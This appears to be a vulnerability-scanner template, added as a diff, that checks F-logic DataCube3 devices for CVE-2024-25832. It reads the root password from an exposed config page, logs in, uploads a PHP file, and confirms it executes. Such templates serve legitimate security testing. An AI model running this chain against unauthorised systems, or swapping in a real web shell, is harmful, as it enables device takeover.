@@ -1,0 +1,122 @@
+id: cv-2024-25832-datacube3-file-upload
+info:
+  name: F-logic DataCube3 Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,cve-2024-25832
+
+variables:
+  random_str: '{{rand_text_alphanumeric(4)}}'
+  random_num: '{{rand_int(1000, 10000)}}'
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/config_all.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: password
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - '"login\.root_pwd","value":"([0-9a-zA-Z-]+)"'
+      - type: regex
+        name: user_id
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - '"login\.root_id","value":"([a-z]+)"'
+
+  - id: "2"
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/config_all.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      user_id={{user_id}}&user_pw={{password}}&login=ログイン
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - 'SESS_IDS=([a-z0-9A-Z]+);'
+
+  - id: "3"
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/setting_photo.php"
+    headers:
+      Cookie: SESS_IDS={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: accesstime
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'name="accesstime" value="(.*?)"'
+
+  - id: "4"
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/setting_photo.php"
+    headers:
+      Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
+      Cookie: SESS_IDS={{cookie}}
+    body: |
+      -----------------------------113389720123090127612523184396
+      Content-Disposition: form-data; name="add"
+
+      .............................
+      -----------------------------113389720123090127612523184396
+      Content-Disposition: form-data; name="addPhoto"; filename="{{random_str}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo {{random_num}};?>
+      -----------------------------113389720123090127612523184396
+      Content-Disposition: form-data; name="accesstime"
+
+      {{accesstime}}
+      -----------------------------113389720123090127612523184396--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: "5"
+    method: GET
+    path:
+      - "{{BaseURL}}/images/slideshow/{{random_str}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{random_num}}'
